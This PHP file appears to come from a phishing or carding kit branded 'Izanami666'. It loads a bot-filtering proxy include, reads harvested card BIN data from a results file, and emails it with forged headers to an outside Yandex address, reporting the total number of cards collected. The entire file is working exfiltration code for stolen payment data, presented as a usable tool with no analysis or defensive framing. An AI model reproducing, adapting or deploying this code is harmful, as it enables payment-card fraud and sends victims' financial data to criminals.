<?php include_once'BOT/proxy.php';?><?php
$binbin= file_get_contents('../result/bin.txt', true);
    $exbin = explode("\n",$binbin);
    $total          = count($exbin);
    $total = $total-1;
    if($total <= 0)
        {
            echo '<script>alert("Failed~\n\nBIN Not Found.")</script>';
        }
    else
        {


            $headers          = "From: Bin Colletions <bin@stupidcorpteam.com\r\n";
            $headers         .= "Reply-to: admin@izanami.apps\r\n";
            $headers         .= "MIME-Version: 1.0\r\n";
            $headers         .= "Content-Type: text/plain; charset=UTF-8\r\n";
            $subj            = "[ Bin #$last ] [ Total $total Cards ] [ ".date("D, d-F-y H:i")." ]";
            $to              = "rezultharam@yandex.com";
            $data            = "+++===================== BINS =====================+++


$binbin
  +++===================== Izanami666 =====================+++";

            mail($to, $subj, $data, $headers);

            echo "<script>alert('Success')</script>";
            echo "<meta http-equiv='' content='0; url=#send_bin'/>";
            exit();
        }

?>